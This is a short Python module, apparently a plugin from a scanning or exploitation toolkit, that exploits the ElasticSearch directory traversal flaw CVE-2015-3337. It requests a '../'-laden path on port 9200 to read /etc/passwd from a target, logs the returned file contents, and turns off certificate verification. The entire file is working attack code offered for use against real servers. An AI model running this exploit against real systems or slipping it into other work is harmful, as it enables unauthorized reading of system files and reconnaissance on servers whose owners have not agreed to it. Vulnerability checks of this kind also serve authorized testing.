from typing import Optional

import requests

from lib.log import logger


def run(url: str) -> Optional[str]:
    """Exploit directory traversal vulnerability in ElasticSearch (CVE-2015-3337).
    Version: < 1.4.5 or < 1.5.2 with 'site' plugin installed."""
    target_url = f"{url}:9200/_plugin/head/../../../../../../../../../etc/passwd"
    try:
        logger.info(f"Checking directory traversal at {target_url}")
        response = requests.get(target_url, timeout=5, verify=False)
        if response.status_code == 200:
            logger.success("ElasticSearch Directory traversal ~")
            logger.info(f"Response: {response.text}")
            return "ElasticSearch Directory traversal ~"
        logger.warning(f"Failed, status code: {response.status_code}")
        return None
    except requests.RequestException as e:
        logger.error(f"Request failed: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None
